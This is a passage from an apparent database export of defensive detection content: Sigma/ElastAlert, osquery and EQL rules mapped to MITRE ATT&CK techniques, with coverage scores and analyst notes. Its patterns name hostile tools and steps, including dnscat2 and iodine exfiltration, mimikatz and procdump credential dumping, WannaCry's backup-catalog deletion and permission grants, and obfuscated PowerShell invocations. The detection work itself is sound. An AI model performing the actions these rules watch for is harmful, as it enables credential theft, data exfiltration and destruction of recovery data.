"sysmon_cmstp_execution_by_registry_elastalert.yml", "elastalert": {"name": "cmstp_execution_registry_event_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "winlog.event_data.TargetObject.keyword:*\\\\\\\\cmmgr32.exe*"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects various indicators of Microsoft Connection Manager Profile Installer execution"}}], "osquery": ["select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%CMSTP%';"], "elasticsiem": []}]}}}}	2021-07-21 08:03:28.288672+00
68	yes	other	https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/detect-and-remediate-outlook-rules-forms-attack?view=o365-worldwide	#FFA500	Process commandline parameters,Process monitoring,Mail server	"{'accuracy_score': 30}"	T1137.005	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output."], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
155	no	OSQuery	["1. Find/Explore frameworks/tools to detect windows API usage for tokens DuplicateToken(Ex), ImpersonateLoggedOnUser , and SetThreadToken."]	#FFFFFF	Process monitoring	"{'accuracy_score': 0}"	T1134.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%runas%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
56	no	OSQuery		#FFFFFF	Process monitoring,Process use of network	"{'accuracy_score': 0}"	T1071	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"]}, "windows": {"other": [], "sigma": [], "osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
72	no	other	MacOS	#FFFFFF	File monitoring	"{'accuracy_score': 0}"	T1547.007	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"Monitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
69	no	yaml		#FFFFFF		"{'accuracy_score': 0}"	T1040	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [{"rule": "lnx_network_sniffing.yml", "elastalert": {"name": "network_sniffing_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(agent.type:filebeat AND message:(*tcpdump* OR *tshark*))"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data."}}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
57	no	yaml	Datasource not known for, Direct Volume Access. Sigma rule not verified by converting it to elastalert rule. Couldn't access reference: https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment	#FFFFFF	API monitoring	"{'accuracy_score': 0}"	T1006	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "sysmon_raw_disk_access_using_illegitimate_tools.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
65	no	other	["1. Microsoft Excel should be installed to emulate this attack.", "2. Need to setup a detonation chamber for opening email attachments."]	#FFFFFF	Packet capture,Web proxy,Email gateway,Detonation chamber,SSLTLS inspection,DNS records,Mail server	"{'accuracy_score': 0}"	T1566.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. URL inspection within mail can help detect links leading to malicious sites.\\", \\"2. Use detonation chambers or go to site to determine if they are potentially malicious.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
474	no	\N		#FFFFFF	Process monitoring,Process commandline parameters	{"accuracy_score": 0}	T1016	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": [{"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_config_options.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_report.zeek"], "other": [], "sigma": [{"rule": "zeek_system_network_discovery___linux_0", "elastalert": {"name": "system_network_discovery___linux_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.executable:(*\\\\/firewall\\\\-cmd OR *\\\\/ufw OR *\\\\/iptables OR *\\\\/netstat OR *\\\\/ss OR *\\\\/ip OR *\\\\/ifconfig OR *\\\\/systemd\\\\-resolve OR *\\\\/route) OR process.args:*\\\\/etc\\\\/resolv.conf*)"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects enumeration of local network configuration"}}, {"rule": "zeek_custom_system_network_discovery___windows", "elastalert": {"name": "T1016", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((event.code:\\\\\\"1\\\\\\" AND winlog.channel:\\\\\\"Microsoft\\\\-Windows\\\\-Sysmon\\\\/Operational\\\\\\") AND (process.command_line:(\\\\\\"*tracert\\\\ \\\\-h\\\\ 10\\\\ yahoo.com*\\\\\\" OR \\\\\\"*.WSqmCons\\\\)\\\\)|iex;*\\\\\\" OR \\\\\\"*Fr`omBa`se6`4Str`ing*\\\\\\") OR (process.command_line:\\\\\\"*net\\\\ use\\\\ https\\\\:\\\\/\\\\/docs.live.net*\\\\\\" AND process.command_line:\\\\\\"*@aol.co.uk*\\\\\\")))"}}], "realert": {"minutes": 2}, "priority": 3, "description": "Domain user and group enumeration via network reconnaissance."}}]}]}}}}	2021-07-21 03:14:53.662177+00
61	yes	yaml		#FFA500	Windows Registry	"{'accuracy_score': 10}"	T1546.015	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "sysmon_comhijack_sdclt.yml\\n", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
470	yes	\N	P1	#FFA500	Network protocol analysis	{"accuracy_score": 25}	T1048.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": [{"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb_report.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb1_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb2_detect.zeek"], "other": [], "sigma": [{"rule": "webdav_put_request_0", "elastalert": {"name": "webdav_put_request_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((http.method:\\"PUT\\" AND http.uri:\\"*WebDAV*\\") AND (NOT (destination.ip:(\\"192.168.0.0/16\\" OR \\"172.16.0.0/12\\" OR \\"10.0.0.0/8\\"))))"}}], "realert": {"minutes": 2}, "priority": 4, "description": "A General detection for WebDav user-agent being used to PUT files on a WebDav network share. This could be an indicator of exfiltration."}}], "osquery": [], "elasticsiem": []}]}}}}	2021-08-04 15:15:29.144165+00
201	yes	other	["1. Binary hash checking utility is required."]	#FFA500	File monitoring	"{'accuracy_score': 10}"	T1195.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Use verification of distributed binaries through hash checking or other integrity checking mechanisms.\\", \\"2. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
20	yes	OSQuery,other		#800080	Process monitoring	{"accuracy_score": 70}	T1569.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb_report.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb1_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb2_detect.zeek"], "sigma": [{"rule": "mitre_bzar_indicators_for_execution_0", "elastalert": {"name": "mitre_bzar_indicators_for_execution_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarOpenPolicy2\\") OR (dce_rpc.endpoint:\\"samr\\" AND dce_rpc.operation:\\"SamrConnect4\\") OR (dce_rpc.endpoint:\\"drsuapi\\" AND dce_rpc.operation:\\"DRSUnbind\\") OR (dce_rpc.endpoint:\\"drsuapi\\" AND dce_rpc.operation:\\"DRSCrackNames\\") OR (dce_rpc.endpoint:\\"drsuapi\\" AND dce_rpc.operation:\\"DRSBind\\") OR (dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarClose\\") OR (dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarLookupNames\\") OR (dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarGetUserName\\") OR (dce_rpc.endpoint:\\"srvsvc\\" AND dce_rpc.operation:\\"NetrShareEnum\\") OR (dce_rpc.endpoint:\\"epmapper\\" AND dce_rpc.operation:\\"ept_map\\") OR (dce_rpc.endpoint:\\"samr\\" AND dce_rpc.operation:\\"SamrCloseHandle\\") OR (dce_rpc.endpoint:\\"samr\\" AND dce_rpc.operation:\\"SamrConnect4\\") OR (dce_rpc.endpoint:\\"JobAdd\\" AND dce_rpc.operation:\\"atsvc\\") OR (dce_rpc.endpoint:\\"ITaskSchedulerService\\" AND dce_rpc.operation:\\"SchRpcEnableTask\\") OR (dce_rpc.endpoint:\\"ITaskSchedulerService\\" AND dce_rpc.operation:\\"SchRpcRegisterTask\\") OR (dce_rpc.endpoint:\\"ITaskSchedulerService\\" AND dce_rpc.operation:\\"SchRpcRun\\") OR (dce_rpc.endpoint:\\"IWbemServices\\" AND dce_rpc.operation:\\"ExecMethod\\") OR (dce_rpc.endpoint:\\"IWbemServices\\" AND dce_rpc.operation:\\"ExecMethodAsync\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"CreateServiceA\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"CreateServiceW\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"StartServiceA\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"StartServiceW\\"))"}}], "realert": {"minutes": 2}, "priority": 3, "description": "Windows DCE-RPC functions which indicate an execution techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE"}}], "osquery": [], "elasticsiem": []}, "windows": [{"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%net%';", "select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%sc%';"], "elasticsiem": ["sequence by process.entity_id\\n  [process where process.name : \\"PsExec.exe\\" and event.type == \\"start\\"]\\n  [network where process.name : \\"PsExec.exe\\"]\\n", "sequence by process.entity_id with maxspan = 1m\\n  [process where event.type in (\\"start\\", \\"process_started\\") and\\n     (process.name : \\"sc.exe\\" or process.pe.original_file_name : \\"sc.exe\\") and\\n      process.args : \\"\\\\\\\\\\\\\\\\*\\" and process.args : (\\"binPath=*\\", \\"binpath=*\\") and\\n      process.args : (\\"create\\", \\"config\\", \\"failure\\", \\"start\\")]\\n  [network where process.name : \\"sc.exe\\" and destination.ip != \\"127.0.0.1\\"]\\n"]}, {"zeek": [], "other": [], "sigma": [], "osquery": [], "elasticsiem": []}]}}}}	2021-07-16 07:31:26.958676+00
77	no		["1. It is difficult to monitor suspicious processes which gather system information of perform system discovery. The list of discovery is quite big. https://attack.mitre.org/tactics/TA0007/"]	#FFFFFF	Process monitoring	"{'accuracy_score': 0}"	T1480.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from processes;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
48	yes	OSQuery		#800080	Windows Registry	"{'accuracy_score': 70}"	T1546.011	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\appcompatflags\\\\installedsdb", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\appcompatflags\\\\custom';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
73	no	other	MacOS Dependency.	#FFFFFF	File monitoring,Process commandline parameters,Process monitoring,Binary file metadata	"{'accuracy_score': 0}"	T1546.006	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"Monitor processes for those that may be used to modify binary headers. Monitor file systems for changes to application binaries and invalid checksums/signatures. Changes to binaries that do not line up with application updates or patches are also extremely suspicious.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
113	yes	yaml,OSQuery	Detection supported for Attempt to modify DACLs using ELK SIEM. (Event ID 4670 to be enable)	#008000	Windows event logs,Process monitoring	{"accuracy_score": 90}	T1222.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_ad_object_writedac_access.yml", "elastalert": {"name": "ad_object_writeDAC_access_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((process.command_line:(* +h * OR * -r *) AND process.executable:*attrib.exe) OR process.executable:*icacls.exe OR process.command_line:*takeown.exe*)"}}], "realert": {"minutes": 0}, "priority": 1, "description": "Detects WRITE_DAC access to a domain object"}}, {"rule": "win_malware_wannacry.yml", "elastalert": {"name": "wannacry_ransomware_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.executable:(*\\\\tasksche.exe OR *\\\\mssecsvc.exe OR *\\\\taskdl.exe OR *\\\\taskhsvc.exe OR *\\\\taskse.exe OR *\\\\111.exe OR *\\\\lhdfrgui.exe OR *\\\\diskpart.exe OR *\\\\linuxnew.exe OR *\\\\wannacry.exe) OR process.executable:*WanaDecryptor* OR (process.command_line:*icacls* AND process.command_line:*/grant* AND process.command_line:*Everyone\\\\:F* AND process.command_line:*/T* AND process.command_line:*/C* AND process.command_line:*/Q*) OR (process.command_line:*bcdedit* AND process.command_line:*/set* AND process.command_line:*\\\\{default\\\\}* AND process.command_line:*recoveryenabled* AND process.command_line:*no*) OR (process.command_line:*wbadmin* AND process.command_line:*delete* AND process.command_line:*catalog* AND process.command_line:*\\\\-quiet*) OR process.command_line:*@Please_Read_Me@.txt*)"}}], "realert": {"minutes": 0}, "priority": 1, "description": "Detects WannaCry ransomware activity"}}], "osquery": ["select * from file where directory = 'C:\\\\Windows\\\\Prefetch' and filename like '%takeown%';", "select * from file where directory = 'C:\\\\Windows\\\\Prefetch' and filename like '%icacls%';", "select * from file where directory = 'C:\\\\Windows\\\\Prefetch' and filename like '%attrib.exe%';"], "elasticsiem": [{"name": "Adding Hidden File Attribute via Attrib", "query": "process where event.type in (\\"start\\", \\"process_started\\") and process.name : \\"attrib.exe\\" and process.args : \\"+h\\""}, {"name": "File permission modified using cacls", "query": "process where event.type in (\\"start\\", \\"process_started\\") and process.name : (\\"cacls.exe\\", \\"icacls.exe\\") and process.args : (\\"/g\\", \\"/grant\\") and not process.args : (\\"C:\\\\Users\\\\Public\\\\*\\")"}, {"name": "File permission modified using takeown", "query": "process where event.type in (\\"start\\", \\"process_started\\") and process.name : \\"takeown.exe\\" and process.args : \\"/f\\""}, {"name": "Attempts to modify DACLs and file/directory ownership/permission", "query": "event.code : \\"4670\\" and winlog.event_data.ProcessName :(\\"C:\\\\Windows\\\\explorer.exe\\" or \\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\")"}]}}}}}	2021-07-16 11:22:25.607729+00
80	yes	OSQuery		#800080	Windows Registry	"{'accuracy_score': 50}"	T1546.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select name, type, data from registry where key='HKEY_CURRENT_USER\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\Control Panel\\\\Desktop';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
82	no	other		#FFFFFF	Process commandline parameters,Process monitoring	"{'accuracy_score': 0}"	T1010	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["Monitor process and command line arguments for actions that could be taken to gather system and network information.\\n\\nProcesses indirectly interacting with Windows API to gather information"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
93	yes	yaml		#800080	Process monitoring,File monitoring	"{'accuracy_score': 50}"	T1546.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [{"rule": "lnx_auditd_alter_bash_profile.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
92	yes	OSQuery		#800080	Windows Registry	"{'accuracy_score': 50}"	T1546.008	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select name,type,data from registry where key like 'HKEY_LOCAL_MACHINE\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\%\\\\\\\\';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
86	yes	other,OSQuery		#FFA500	SSLTLS inspection,Antivirus,Web proxy	"{'accuracy_score': 20}"	T1566.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. SSL/TLS inspection is generally required to detect the initial communication/delivery.\\", \\"2. Anti-virus can potentially detect malicious documents and files that are downloaded on the user's computer.\\", \\"3. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened.\\"]"], "sigma": [], "osquery": ["select DISTINCT p.name, p.path, pos.remote_address, pos.remote_port from process_open_sockets pos LEFT JOIN processes p ON pos.pid = p.pid WHERE pos.remote_port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
96	no	other		#FFFFFF	Office  audit logs	"{'accuracy_score': 0}"	T1098.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Monitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions being granted to compromised accounts.\\n2. A larger than normal volume of emails sent from an account and similar phishing emails sent from real accounts within a network may be a sign that an account was compromised and attempts to leverage access with modified email permissions is occurring.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
59	yes	other	Tool to execute on Machine - dncat2, after that only we get the dncat2 event in ELK	#FFA500	Packet capture,Network protocol analysis	{"accuracy_score": 10}	T1132.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"]}, "network": {"zeek": ["SO has default zeek dns scripts installed"], "sigma": [{"rule": "dns_exfiltration_and_tunneling_tools_execution_0", "elastalert": {"name": "dns_exfiltration_and_tunneling_tools_execution_0", "type": "any", "alert": ["debug"], "index": "winlogbeat-*", "filter": [{"query_string": {"query": "(process.executable.keyword:*\\\\\\\\iodine.exe OR process.executable.keyword:*\\\\\\\\dnscat2*)"}}], "realert": {"minutes": 2}, "priority": 2, "description": "Well-known DNS Exfiltration tools execution"}}], "osquery": [], "elasticsiem": []}}}}}	2021-07-21 04:37:53.716396+00
53	yes	OSQuery	["Monitor Windows Task Scheduler stores in %systemroot%\\\\System32\\\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.", "Configure event logging for scheduled task creation and changes by enabling the 'Microsoft-Windows-TaskScheduler/Operational' setting within the event logging service. Monitor Event Ids 106, 140, 141, 4702, 4699, 4698, 4700, 4701."]	#800080	Windows event logs,Process monitoring,File monitoring,Process monitoring,File monitoring,Process commandline parameters,Process monitoring,Windows event logs	{"accuracy_score": 70}	T1053.005	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb_report.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb1_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb2_detect.zeek"], "sigma": [{"rule": "mitre_bzar_indicators_for_execution_0", "elastalert": {"name": "mitre_bzar_indicators_for_execution_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarOpenPolicy2\\") OR (dce_rpc.endpoint:\\"samr\\" AND dce_rpc.operation:\\"SamrConnect4\\") OR (dce_rpc.endpoint:\\"drsuapi\\" AND dce_rpc.operation:\\"DRSUnbind\\") OR (dce_rpc.endpoint:\\"drsuapi\\" AND dce_rpc.operation:\\"DRSCrackNames\\") OR (dce_rpc.endpoint:\\"drsuapi\\" AND dce_rpc.operation:\\"DRSBind\\") OR (dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarClose\\") OR (dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarLookupNames\\") OR (dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarGetUserName\\") OR (dce_rpc.endpoint:\\"srvsvc\\" AND dce_rpc.operation:\\"NetrShareEnum\\") OR (dce_rpc.endpoint:\\"epmapper\\" AND dce_rpc.operation:\\"ept_map\\") OR (dce_rpc.endpoint:\\"samr\\" AND dce_rpc.operation:\\"SamrCloseHandle\\") OR (dce_rpc.endpoint:\\"samr\\" AND dce_rpc.operation:\\"SamrConnect4\\") OR (dce_rpc.endpoint:\\"JobAdd\\" AND dce_rpc.operation:\\"atsvc\\") OR (dce_rpc.endpoint:\\"ITaskSchedulerService\\" AND dce_rpc.operation:\\"SchRpcEnableTask\\") OR (dce_rpc.endpoint:\\"ITaskSchedulerService\\" AND dce_rpc.operation:\\"SchRpcRegisterTask\\") OR (dce_rpc.endpoint:\\"ITaskSchedulerService\\" AND dce_rpc.operation:\\"SchRpcRun\\") OR (dce_rpc.endpoint:\\"IWbemServices\\" AND dce_rpc.operation:\\"ExecMethod\\") OR (dce_rpc.endpoint:\\"IWbemServices\\" AND dce_rpc.operation:\\"ExecMethodAsync\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"CreateServiceA\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"CreateServiceW\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"StartServiceA\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"StartServiceW\\"))"}}], "realert": {"minutes": 2}, "priority": 3, "description": "Windows DCE-RPC functions which indicate an execution techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE"}}], "osquery": [], "elasticsiem": []}, "windows": [{"other": [], "sigma": [], "osquery": ["select * from windows_events where eventid=4698;", "select * from windows_events where eventid=4701;", "select * from windows_events where eventid=4700;", "select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%schtasks%';", "select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%taskeng%';", "select * from processes p where p.parent=(select pid from processes where name='svchost.exe');", "select * from processes p where p.parent=(select pid from processes where name='taskeng.exe');", "select name,action,path,enabled,datetime(next_run_time,'unixepoch','UTC') from scheduled_tasks;"], "elasticsiem": []}, {"zeek": [], "other": [], "sigma": [{"rule": "", "elastalert": ""}], "osquery": [], "elasticsiem": []}]}}}}	2021-07-28 16:00:27.496138+00
89	yes	OSQuery,other	["1. Need to capture events when python script is executed.", "2. Also capture such script files from system."]	#FFA500	Process monitoring,Process commandline parameters,System calls,Process monitoring,Process commandline parameters,API monitoring	"{'accuracy_score': 10}"	T1059.006	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\\"]"], "sigma": [], "osquery": ["SELECT * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%python%.exe';", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
75	yes		["1. Couldn't get results for process or process cmdline parameters for linux at tool using osquery."]	#FFA500	Process commandline parameters,Process monitoring	"{'accuracy_score': 10}"	T1053.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline like '%at%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
87	no	other	MacOS Dependency.	#FFFFFF	PowerShell logs,File monitoring,Process commandline parameters,Process monitoring	"{'accuracy_score': 0}"	T1546.014	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"Monitor emond rules creation by checking for files created or modified in /etc/emond.d/rules/ and /private/var/db/emondClients.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
95	yes	OSQuery	Process Monitoring	#008000	Process monitoring	"{'accuracy_score': 90}"	T1110.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%mimikatz%';", "select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%procdump%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
130	no	OSQuery		#FFFFFF	Process use of network,Process monitoring	"{'accuracy_score': 0}"	T1090	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
120	no	OSQuery	Open source detection query.	#FFFFFF	File monitoring,Process monitoring	"{'accuracy_score': 0}"	T1074.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select f.path,f.directory,u.username,f.hard_links,f.symlink,datetime(f.btime, 'unixepoch', 'UTC') as btime, datetime(f.atime, 'unixepoch', 'UTC') as atime, datetime(f.ctime, 'unixepoch', 'UTC') as ctime, datetime(f.mtime, 'unixepoch', 'UTC') as mtime from file f LEFT JOIN users u on f.uid=u.uid where f.path like 'C:\\\\users\\\\%\\\\AppData\\\\Local\\\\%' AND f.type='directory';", "SELECT hash.md5, path, file.filename, datetime(file.btime, 'unixepoch', 'UTC') as btime, datetime(file.atime, 'unixepoch', 'UTC') as atime, datetime(file.ctime, 'unixepoch', 'UTC') as ctime, datetime(file.mtime, 'unixepoch', 'UTC') as mtime FROM hash JOIN file USING (path) where path like 'C:\\\\Windows\\\\temp\\\\%' and type='regular';", "select f.path,f.directory,u.username,f.hard_links,f.symlink,datetime(f.btime, 'unixepoch', 'UTC') as btime, datetime(f.atime, 'unixepoch', 'UTC') as atime, datetime(f.ctime, 'unixepoch', 'UTC') as ctime, datetime(f.mtime, 'unixepoch', 'UTC') as mtime from file f LEFT JOIN users u on f.uid=u.uid where f.path like 'C:\\\\Windows\\\\temp\\\\%' AND f.type='directory';", "select f.path,f.directory,u.username,f.hard_links,f.symlink,datetime(f.btime, 'unixepoch', 'UTC') as btime, 